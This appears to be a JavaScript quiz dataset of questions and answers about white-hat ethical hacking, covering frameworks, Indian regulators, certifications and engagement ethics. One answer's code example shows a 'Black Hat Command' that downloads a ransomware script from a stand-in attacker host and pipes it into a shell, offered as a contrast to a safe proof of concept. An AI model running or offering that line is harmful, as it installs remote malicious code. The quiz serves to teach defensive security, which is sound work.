const questions = [
  {
    question: "What is the primary defining characteristic of a 'White Hat Hacker' compared to Black Hat and Grey Hat hackers?",
    shortAnswer: "White Hat hackers operate exclusively with prior written authorization, adhering strictly to legal frameworks and codes of ethics to defend systems.",
    explanation: "White Hat hackers (also known as ethical hackers or defensive security professionals) utilize offensive hacking techniques solely for authorized defensive purposes. They hold explicit permission from system owners, adhere to legally binding scopes of work, never disclose confidential data, and provide detailed remediation blueprints to secure vulnerabilities before malicious threat actors can exploit them.",
    hint: "Recall that White Hats always operate with explicit legal authorization and defensive intent.",
    level: "basic",
    codeExample: `// White Hat Fiduciary Duty:
Objective: Find vulnerabilities → Document Root Cause → Propose Remediation → Verify Patch
Authorization: Signed Rules of Engagement (RoE) + Non-Disclosure Agreement (NDA)`
  },
  {
    question: "What are the primary differences between the PTES (Penetration Testing Execution Standard) and OSSTMM (Open Source Security Testing Methodology Manual)?",
    shortAnswer: "PTES focuses on the complete technical lifecycle of a penetration test; OSSTMM provides scientific, metrics-based operational security testing and risk measurement.",
    explanation: "PTES defines seven distinct phases of a penetration test (Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, and Reporting). In contrast, Pete Herzog's OSSTMM provides a formal scientific methodology measuring operational security across five channels (Human, Physical, Wireless, Telecommunications, and Data Networks), calculating a quantifiable 'Ravs' (Risk Assessment Value) metric.",
    hint: "Think about which framework provides the 7-phase pentest standard (PTES) versus which provides scientific operational security metrics (OSSTMM).",
    level: "expert",
    codeExample: `// PTES 7-Phase Execution Standard:
1. Pre-engagement Interactions
2. Intelligence Gathering (OSINT)
3. Threat Modeling
4. Vulnerability Analysis
5. Exploitation
6. Post-Exploitation
7. Comprehensive Reporting`
  },
  {
    question: "How does a 'Red Team Assessment' differ fundamentally from a standard 'Vulnerability Assessment' or 'Penetration Test'?",
    shortAnswer: "Vulnerability assessments find as many flaws as possible; Red Teams simulate a realistic multi-stage nation-state adversary to test detection and response capabilities of the Blue Team.",
    explanation: "A Vulnerability Assessment is a broad scan to catalog all known security weaknesses. A standard Penetration Test focuses on exploiting specific vulnerabilities within a defined scope. A Red Team engagement is a goal-oriented adversarial campaign (e.g., 'steal the core customer database' or 'simulate ransomware deployment') that tests people, processes, physical security, and blue-team SOC detection over weeks or months with minimal scope restrictions.",
    hint: "Compare cataloging all open windows (vulnerability assessment) versus simulating an undercover spy attempting to steal the crown jewels (Red Teaming).",
    level: "moderate",
    codeExample: `// Assessment Comparison:
Vulnerability Scan: Broad, automated, identifies 200 low-hanging flaws.
Penetration Test:   Deep, focused on exploiting identified flaws in target web/network scope.
Red Team Exercise:  Adversarial campaign testing Blue Team detection, dwell time, and human response.`
  },
  {
    question: "What is a 'CERT-In Empanelled Information Security Auditing Organization', and why is it legally significant in India?",
    shortAnswer: "Organizations vetted and certified by CERT-In to audit government departments, critical national infrastructure, and banking systems for regulatory compliance.",
    explanation: "Under the Ministry of Electronics and Information Technology (MeitY), the Indian Computer Emergency Response Team (CERT-In) conducts rigorous evaluations of cybersecurity firms. Empanelled auditing firms are legally authorized to perform mandatory security audits on Reserve Bank of India (RBI) regulated payment switches, Aadhaar authentication agencies (UIDAI), state electricity grids, and government digital portals.",
    hint: "Think of the official government accreditation that authorizes cybersecurity firms to audit Indian banking and critical infrastructure.",
    level: "moderate",
    codeExample: `// Indian Regulatory Mandate:
Client: Core Banking Payment Switch (Kolkata)
Audit Requirement: Annual Cyber Security Audit by CERT-In Empanelled Auditor
Statutory Compliance: RBI Master Direction on Cyber Security Framework in Banks`
  },
  {
    question: "How does the NIST SP 800-115 guideline categorize the technical methods used in information security testing?",
    shortAnswer: "Into three primary technical categories: Review techniques (documentation/code), Target Identification and Analysis (scanning/sniffing), and Target Vulnerability Validation (penetration testing).",
    explanation: "NIST Special Publication 800-115 ('Technical Guide to Information Security Testing and Assessment') outlines the US federal standard for security audits: 1. Review Techniques (inspecting documentation, log reviews, ruleset reviews, and source code auditing); 2. Target Identification & Analysis (network discovery, port scanning, wireless monitoring); 3. Target Vulnerability Validation (password cracking, penetration testing, and social engineering simulation).",
    hint: "Remember the 3 pillars of NIST SP 800-115: Review, Identify & Analyze, and Validate.",
    level: "expert",
    codeExample: `// NIST SP 800-115 Testing Framework:
1. Review Techniques             → Source Code Review & Firewall Ruleset Auditing
2. Target Identification         → Port Scanning, OSINT & Service Fingerprinting
3. Vulnerability Validation      → Active Exploitation & Privilege Escalation`
  },
  {
    question: "What is the primary role of a 'Vulnerability Researcher' and 'Reverse Engineer' in the white-hat cybersecurity ecosystem?",
    shortAnswer: "To discover previously unknown zero-day vulnerabilities in hardware firmware, operating system kernels, and compiled binaries using disassemblers and fuzzing.",
    explanation: "Unlike general penetration testers who search for known configuration errors and N-day bugs, vulnerability researchers dissect compiled machine code (using tools like Ghidra, IDA Pro, and Radare2) and write coverage-guided fuzzers (AFL, libFuzzer). They identify deep memory corruption flaws, race conditions, and cryptographic weaknesses, submitting formal CVE advisories to vendors under coordinated disclosure.",
    hint: "Think of the specialists who analyze raw assembly code to find new zero-day vulnerabilities in software kernels.",
    level: "expert",
    codeExample: `// Vulnerability Research Toolchain:
Disassembler / Decompiler: NSA Ghidra / IDA Pro / Binary Ninja
Fuzzing Engine:            American Fuzzy Lop (AFL++) / Honggfuzz
Debugger:                  GDB with PEDA / WinDbg / x64dbg`
  },
  {
    question: "How do the OWASP Web Security Testing Guide (WSTG v4.2) and Mobile Security Testing Guide (MSTG) assist White Hat web application testers?",
    shortAnswer: "They provide comprehensive, standardized testing checklists and test cases covering authentication, session management, input validation, cryptography, and business logic.",
    explanation: "The Open Worldwide Application Security Project (OWASP) WSTG provides an industry-standard methodology for auditing web applications across 12 categories (e.g., Information Gathering, Configuration Management, Identity Management, Authentication, Authorization, Session Management, Input Validation, Cryptography, Business Logic, and Client-Side). It ensures that white-hat audits are thorough, repeatable, and aligned with global standards.",
    hint: "Recall the comprehensive open-source web application testing guide developed by OWASP.",
    level: "basic",
    codeExample: `// OWASP WSTG Testing Categories Sample:
WSTG-ATHN-01: Testing for Credentials Transported over Unencrypted Channels
WSTG-AUTH-02: Testing for Bypassing Authorization Schema (IDOR)
WSTG-INPV-05: Testing for SQL Injection`
  },
  {
    question: "What is 'Threat Hunting', and how does a White Hat threat hunter differ from an automated Security Information and Event Management (SIEM) system?",
    shortAnswer: "SIEM detects known attacks matching predefined alert rules; Threat Hunters proactively search through network telemetry to discover stealthy adversaries who evaded detection.",
    explanation: "Automated SIEMs (like Splunk or Microsoft Sentinel) rely on known signatures, correlation rules, and threshold triggers. A White Hat Threat Hunter operates on the hypothesis that the network is already compromised. Using deep knowledge of the MITRE ATT&CK framework, threat hunters query endpoint detection and response (EDR) telemetry to uncover living-off-the-land techniques (LotL), unusual PowerShell child processes, and beaconing traffic that triggered zero automated alarms.",
    hint: "Think about an active investigator looking for subtle clues of an intruder who successfully bypassed the alarm system.",
    level: "moderate",
    codeExample: `// Threat Hunting Hypothesis Query (Splunk SPL):
// Hunting for anomalous PowerShell execution spawned by Microsoft Word:
index=endpoint_telemetry parent_process="winword.exe" process="powershell.exe"
| stats count by host, user, command_line`
  },
  {
    question: "What are the most prestigious and globally recognized offensive security certifications for White Hat penetration testers?",
    shortAnswer: "OSCP (Offensive Security Certified Professional), CRTO (Certified Red Team Operator), CEH (Certified Ethical Hacker), and GPEN (GIAC Penetration Tester).",
    explanation: "The OSCP certification is famous for its grueling 24-hour hands-on practical exam where candidates must compromise multiple target machines without automated scanners. The CRTO focuses on real-world Active Directory exploitation and evasive Red Teaming with Cobalt Strike. CEH provides foundational broad knowledge of hacking terminology, tools, and legal frameworks.",
    hint: "Recall the famous 24-hour hands-on practical penetration testing certification from Offensive Security.",
    level: "basic",
    codeExample: `// Top White Hat Certifications:
1. OSCP (Offensive Security) → Practical hands-on exploitation & reporting (24-hr exam)
2. CRTO (Zero-Point Security) → Active Directory & Red Team Command-and-Control
3. CISSP ((ISC)²)            → Strategic enterprise security governance & management`
  },
  {
    question: "What is 'Physical Penetration Testing', and what legal safeguards must a White Hat tester enforce before picking locks or cloning RFID badges?",
    shortAnswer: "Testing physical security perimeters (doors, fences, guard desks, server rooms); requires an executive authorization letter, guard liaison protocols, and explicit property boundaries.",
    explanation: "Physical penetration testing evaluates whether an attacker can physically enter a building, pick mechanical lock tumblers, clone low-frequency HID Prox RFID badges, or bypass biometric turnstiles to reach sensitive server rooms. Testers must carry a signed 'Get Out of Jail Free' letter on client letterhead with 24/7 executive contact numbers, ensure the facility is 100% client-owned (not shared leased space where non-client tenants exist), and avoid damaging emergency fire egress doors.",
    hint: "Think about testing building doors, locks, and guard desks rather than software ports.",
    level: "moderate",
    codeExample: `// Physical Pentest Toolset:
1. Lockpicks & Bypass Shims (Mechanical door latch bypass)
2. Proxmark3 (125 kHz / 13.56 MHz RFID badge cloning)
3. Rubber Ducky / Bash Bunny (Keystroke injection hardware)
4. Official Signed Executive Authorization Letter`
  },
  {
    question: "In the Indian corporate ecosystem, what is the role of the Data Security Council of India (DSCI) established by NASSCOM?",
    shortAnswer: "DSCI is a premier industry body that develops data protection standards, promotes cybersecurity capacity building, and shapes national cyber policy.",
    explanation: "Established by NASSCOM, the Data Security Council of India (DSCI) collaborates with the Ministry of Electronics and IT (MeitY), law enforcement agencies, and global technology leaders. It formulates cybersecurity best practice frameworks, organizes national security summits, fosters white-hat research and ethical hacking talent, and guides enterprises on compliance with India's DPDP Act 2023.",
    hint: "Remember the premier cybersecurity industry body set up by NASSCOM in India.",
    level: "basic",
    codeExample: `// DSCI Strategic Role:
Organization: Data Security Council of India (DSCI)
Founder: NASSCOM
Focus: Enterprise Cybersecurity Maturity Models, Capacity Building & Policy Advocacy`
  },
  {
    question: "What is 'Social Engineering Penetration Testing', and what ethical boundaries must be established in the Rules of Engagement?",
    shortAnswer: "Simulating human deception (phishing, vishing, pretexting); must strictly forbid personal financial loss, harassment, targeting employee families, or violating personal privacy.",
    explanation: "Social engineering tests employee vigilance against email phishing, telephone impersonation (vishing), and physical tailgating. Ethical boundaries in the RoE mandate that simulated phishing emails must not reference personal employee family tragedies, COVID health scares, termination threats, or fake bonus deposits that cause extreme psychological distress. Discovered employee passwords must never be stored in cleartext.",
    hint: "Consider why an ethical phishing simulation must never threaten employees with firing or target their families.",
    level: "moderate",
    codeExample: `// Ethical Phishing Campaign Guardrails:
Allowed: Simulating IT Helpdesk password reset portal or shared OneDrive link.
Prohibited: Fake termination notices, tax audit threats, or personal family emergencies.`
  },
  {
    question: "How does a White Hat security consultant conduct a 'Gap Analysis' against international standards like ISO/IEC 27001?",
    shortAnswer: "By comparing an organization's existing security policies, technical controls, and operational procedures against the required Annex A control objectives of ISO 27001.",
    explanation: "In an ISO 27001 gap analysis, the white-hat auditor evaluates the organization's Information Security Management System (ISMS). They review asset management, access controls, cryptographic controls, incident response plans, and supplier relationships against the 93 controls in ISO/IEC 27001:2022. The output is a detailed 'Statement of Applicability' (SoA) and remediation roadmap to achieve formal certification.",
    hint: "Think of measuring the distance between a company's current security state and an international ISO standard.",
    level: "moderate",
    codeExample: `// Gap Analysis Matrix Structure:
+--------------------+------------------------+-------------------+-----------------------------+
| ISO 27001 Control  | Current Client Status  | Compliance Level  | Required Remediation Action |
+--------------------+------------------------+-------------------+-----------------------------+
| A.9.2 Access Auth  | Single-factor Password | Non-Compliant     | Deploy FIDO2 Passkeys / MFA |
| A.12.1 Log Archival| 14 Days Retained       | Partial (60%)     | Extend to 180 Days (CERT-In)|
+--------------------+------------------------+-------------------+-----------------------------+`
  },
  {
    question: "Why is 'Report Writing' considered by industry leaders to be the most critical skill of an ethical hacker?",
    shortAnswer: "Because the report is the only tangible business deliverable the client receives; if findings are poorly explained, executives will not understand or fund the necessary fixes.",
    explanation: "Finding an exploit is only half the job. An outstanding ethical hacking report consists of two vital sections: 1. Executive Summary (written in clear business risk and financial terms for the Board of Directors and C-level leaders, explaining business impact in ₹ INR); 2. Technical Findings (detailed step-by-step reproduction steps, raw HTTP requests, CVSS vectors, and precise code/configuration remediation for developers).",
    hint: "Think about why a brilliant exploit is useless to a company if the written report is confusing and fails to convince executives to patch it.",
    level: "basic",
    codeExample: `// Professional Pentest Report Structure:
1. Executive Summary (Business Risk, Threat Impact & High-Level Posture Score)
2. Methodology & Scope Verification (Target IPs, Tools Used, Dates)
3. Findings Summary Matrix (Critical, High, Medium, Low breakdown)
4. Detailed Technical Findings (Vulnerability Description, Proof-of-Concept, Remediation Code)`
  },
  {
    question: "What is 'Source Code Auditing' (Static Application Security Testing - SAST), and how do White Hat auditors find subtle security flaws?",
    shortAnswer: "Manual and automated line-by-line inspection of application source code to discover logic flaws, hardcoded credentials, and unsafe API calls before deployment.",
    explanation: "White-hat source code auditors examine code in IDEs and using static analyzers (Semgrep, SonarQube, CodeQL). They perform 'Taint Analysis', tracing untrusted user input from its entry point (Source - e.g., `req.body.username`) down to dangerous execution functions (Sink - e.g., `eval()`, `exec()`, or raw SQL queries) to verify whether sanitization or parameterized binding occurs.",
    hint: "Think about tracing where user input enters a program (source) and where it touches sensitive functions (sink).",
    level: "expert",
    codeExample: `// CodeQL Taint Analysis Concept:
// Source: function get_user_input(req)
// Sink:   db_execute_raw_string(query)
// Taint Rule: If untrusted input flows from Source to Sink without Passing Sanitizer → Flag Critical SQLi`
  },
  {
    question: "How does a White Hat 'Bug Bounty Hunter' maintain legal safe harbor while hunting on platforms like HackerOne or Bugcrowd?",
    shortAnswer: "By strictly respecting program scope policies, avoiding disruption of live services, never accessing more data than necessary for a PoC, and reporting exclusively through the official platform.",
    explanation: "Public bug bounty programs establish precise terms of service. To stay protected under legal safe harbor, the hunter must: 1. Only test listed in-scope domains; 2. Stop testing immediately upon discovering a flaw (e.g., verifying SQLi by reading `SELECT @@version`, never dumping entire customer databases); 3. Submit findings through the platform rather than emailing employees directly; 4. Never demand ransoms or publicize the flaw before vendor resolution.",
    hint: "Recall that dumping an entire database when discovering an SQL injection vulnerability violates bug bounty safe harbor.",
    level: "moderate",
    codeExample: `// Bug Bounty Safe Proof-of-Concept Rule:
// ALLOWED: SELECT version(); → Proves SQL injection exists with zero data privacy breach.
// FORBIDDEN: SELECT * FROM customer_credit_cards; → Violates privacy, breaches safe harbor!`
  },
  {
    question: "What is the 'National Critical Information Infrastructure Protection Centre' (NCIIPC) in India, and how does it collaborate with White Hat researchers?",
    shortAnswer: "NCIIPC is the national agency designated to protect Critical Information Infrastructure (CII); it operates a Responsible Vulnerability Disclosure program for critical national sectors.",
    explanation: "Created under Section 70A of the IT Act 2000, NCIIPC safeguards vital national sectors: Power & Energy, Banking & FinTech, Telecom, Transport, Government, and Strategic/Defense enterprises. White-hat researchers who discover critical security vulnerabilities in Indian power grids, railway systems, or banking switches submit PGP-encrypted vulnerability reports directly to NCIIPC (`rvdp@nciipc.gov.in`), which coordinates emergency patching without legal retribution.",
    hint: "Remember the Indian national nodal agency for protecting Critical Information Infrastructure (CII).",
    level: "moderate",
    codeExample: `// NCIIPC Responsible Vulnerability Disclosure Program (RVDP):
Nodal Agency: National Critical Information Infrastructure Protection Centre (NCIIPC)
Protected Sectors: Power, Banking, Telecom, Transport, Strategic Enterprises
Reporting Channel: rvdp@nciipc.gov.in (With Safe Harbor for Ethical Researchers)`
  },
  {
    question: "What ethical obligation does a White Hat hacker have regarding 'Post-Exploitation Artifact Cleanup'?",
    shortAnswer: "The mandatory removal of all uploaded webshells, test accounts, modified registry keys, and temporary files created during the penetration test.",
    explanation: "During exploitation, a tester might compile a local exploit, add a temporary local administrator account (`test_auditor_admin`), or drop a benign PHP webshell to demonstrate remote code execution. If the tester forgets to delete these artifacts upon concluding the audit, an actual malicious black-hat hacker scanning the server later could discover and use the leftover backdoor, directly compromising the client.",
    hint: "Think about cleaning up all your tools and temporary test files so an actual burglar cannot use the door you left unlocked.",
    level: "basic",
    codeExample: `// Post-Engagement Cleanup Checklist:
[X] Delete temporary uploaded test scripts (/tmp/poc.php)
[X] Delete created audit user accounts (net user test_audit /delete)
[X] Revert modified configuration files and firewall test rules
[X] Document full cleanup log in the appendix of the final report`
  },
  {
    question: "What is the difference between 'Black-Hat Exploitation' and 'White-Hat Vulnerability Validation' when discovering a Remote Code Execution (RCE) flaw?",
    shortAnswer: "Black hats install persistent backdoors and exfiltrate data; White hats execute a harmless diagnostic command (like `id` or `hostname`), document the flaw, and assist in patching.",
    explanation: "When encountering an unauthenticated RCE vulnerability (e.g., Apache Log4Shell), a malicious black-hat drops a persistent rootkit, establishes Cobalt Strike C2 beacons, and steals credentials. A white-hat ethical hacker executes a minimal, non-disruptive proof-of-concept command (e.g., `hostname` or calculating `2+2` via OGNL), captures a sanitized screenshot, immediately notifies the client CISO, and provides defensive WAF rules and patch links.",
    hint: "Contrast deploying ransomware and stealing files versus proving the vulnerability with a harmless `hostname` command.",
    level: "basic",
    codeExample: `// White Hat PoC vs Black Hat Attack:
White Hat Command:  curl -X POST http://target/api -d "cmd=hostname" (Proves execution safely)
Black Hat Command:  curl -X POST http://target/api -d "cmd=curl http://c2.evil/ransomware.sh | sh"`
  },
  {
    question: "Synthesizing the role of White Hat hackers in 21st-century digital society: why is ethical hacking an indispensable pillar of modern technological resilience?",
    shortAnswer: "Because defenders must understand adversarial tactics to build effective defenses; White Hat hackers provide the continuous stress-testing required to keep global digital society secure.",
    explanation: "In an interconnected world where banking, healthcare, power grids, and democratic elections depend on software, building defenses without understanding real-world attack techniques is an illusion. White Hat hackers are the immune system of the digital world—relentlessly probing, discovering flaws, and guiding engineers to build resilient, trustworthy architectures before adversaries can inflict catastrophic harm.",
    hint: "Conclude by recognizing that White Hat hackers act as the essential immune system protecting digital society.",
    level: "expert",
    codeExample: `// The White Hat Cyber Philosophy:
"To catch a thief, you must think like a thief; but to defend civilization, you must live with unwavering moral integrity."`
  }
];

export default questions;
